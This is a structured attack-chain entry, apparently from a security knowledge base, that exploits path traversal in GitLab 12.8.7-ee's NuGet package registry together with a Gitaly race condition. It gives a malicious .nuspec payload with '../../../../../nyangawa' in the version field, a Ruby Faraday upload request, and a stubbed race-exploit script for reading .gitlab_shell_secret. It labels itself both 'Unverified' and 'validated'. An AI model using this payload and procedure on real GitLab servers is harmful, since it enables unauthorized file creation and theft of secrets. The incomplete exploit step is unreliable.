---
tags:
  - path-traversal
  - race-condition
  - gitlab
  - nuget
  - arbitrary-file-read
  - file-creation
type: attack_chain
tools:
  - '[[tools/Faraday-Ruby-HTTP-Client]]'
  - '[[tools/RubyZip-Archive-Library]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-NuGet-Package-with-Path-Traversal-Payload]]'
  - '[[procedures/Upload-Malicious-NuGet-Package-to-GitLab-Registry]]'
  - '[[procedures/Exploit-Gitaly-Race-Condition-for-Arbitrary-File-Read]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:27.685Z'
description: >-
  A multi-stage exploit chaining path traversal in GitLab's NuGet Package
  Registry with a Gitaly race condition to achieve arbitrary file creation and
  reads on the GitLab instance.
skill_level: intermediate
impact_level: high
id: 96cf1457-e733-46bf-a418-14fa2baee6f2
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Path Traversal in GitLab NuGet Registry Leading to Arbitrary File Read via Gitaly Race Condition

Multi-stage attack chain exploiting a path traversal vulnerability in GitLab's NuGet Package Registry (version 12.8.7-ee) to create arbitrary .nupkg files anywhere on the filesystem, then leveraging a known Gitaly race condition to read sensitive files like .gitlab_shell_secret.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious Package] --> B[Upload to Registry]
    B --> C[Exploit Race for File Read]
    C --> D[Exfiltrate Sensitive Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Faraday-Ruby-HTTP-Client]]
- [[tools/RubyZip-Archive-Library]]

### Target Environment

- GitLab Enterprise Edition 12.8.7-ee on Linux
- Services: PostgreSQL 10.12, Redis 5.0.7, Gitaly, Sidekiq 5.2.7, Git 2.24.1
- Tech Stack: Ruby 2.6.5, Bundler 1.17.3, Rake 12.3.3, Nokogiri
- Network access to GitLab API endpoint (/api/v4/projects/#{id}/packages/nuget/)

### Initial Access Requirements

- Valid project ID and authentication token for NuGet package upload
- Ruby environment for scripting
- No prior shell access required; exploits authenticated API

## Detailed Attack Procedures

### Step 1: Create Malicious NuGet Package

procedure: [[procedures/Create-Malicious-NuGet-Package-with-Path-Traversal-Payload]]

**Objective**: Craft a malicious .nuspec XML file with a path traversal payload in the version field to manipulate file creation paths during extraction.

**Instructions**: Install required gems if not present, then create the XML and zip it into a .nupkg file. Use [[commands/gem-install-rubyzip]] to ensure ZIP handling:

```bash
gem install rubyzip
```

Craft dummy.nuspec with traversal payload:

```xml
<?xml version="1.0"?>
<package>
  <metadata>
    <id>DummyProject.DummyPackage</id>
    <version>../../../../../nyangawa</version>
  </metadata>
</package>
```

Then zip it using Ruby script or rubyzip library to form dummy.nupkg.

**Expected Output**: A dummy.nupkg file ready for upload, containing the unsanitized XML.

**Success Indicators**:
- XML file created with traversal string
- .nupkg archive validates without errors

### Step 2: Upload Malicious NuGet Package

procedure: [[procedures/Upload-Malicious-NuGet-Package-to-GitLab-Registry]]

**Objective**: Upload the package to trigger unsanitized metadata extraction, creating an arbitrary .nupkg file (e.g., nyangawa.nupkg) in a traversed path like the root filesystem.

**Instructions**: Install Faraday for HTTP requests with [[commands/gem-install-faraday]]:

```bash
gem install faraday
```

Use a Ruby script with Faraday to send PUT request:

```ruby
require 'faraday'
conn = Faraday.new(url: 'https://target-gitlab.com')
conn.put("/api/v4/projects/#{project_id}/packages/nuget/", File.read('dummy.nupkg'), {'Content-Type' => 'application/octet-stream'})
```

This exploits the Nokogiri XML parsing in metadata_extraction_service.rb, concatenating id and version into package_filename without sanitization.

**Expected Output**: HTTP 200/201 response; file created as git user in traversed location.

**Success Indicators**:
- Upload succeeds without errors
- No immediate alerts; check logs for file creation

### Step 3: Exploit Gitaly Race Condition

procedure: [[procedures/Exploit-Gitaly-Race-Condition-for-Arbitrary-File-Read]]

**Objective**: Use the created file to race Gitaly operations, enabling read of sensitive files like .gitlab_shell_secret.

**Instructions**: Run a custom Ruby exploit script (exp.rb) combining the traversed file with concurrent Gitaly calls, leveraging tools like Faraday and RubyZip. Reference prior Gitaly issues (#762421, #732330) for timing.

Example script snippet:

```ruby
# exp.rb - Custom race exploit
require 'faraday'
require 'rubyzip'
# Logic to trigger concurrent Gitaly ops while accessing nyangawa.nupkg
# Read target file: File.read('/path/to/.gitlab_shell_secret')
```

After exploitation, verify with [[commands/gitlab-rake-env-info]]:

```bash
gitlab-rake gitlab:env:info
```

**Expected Output**: Contents of sensitive files exposed; env info confirms GitLab 12.8.7-ee.

**Success Indicators**:
- Arbitrary file contents retrieved
- No crashes in Gitaly; successful race

## Attack Chain Summary

### Key Achievements

1. Arbitrary .nupkg file creation via path traversal in NuGet metadata handling
2. Chaining with Gitaly race for filesystem read access as git user
3. Exposure of sensitive configs like .gitlab_shell_secret

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Discovery]] Discovery

---

*Last updated: 2023-10-01T00:00:00Z*
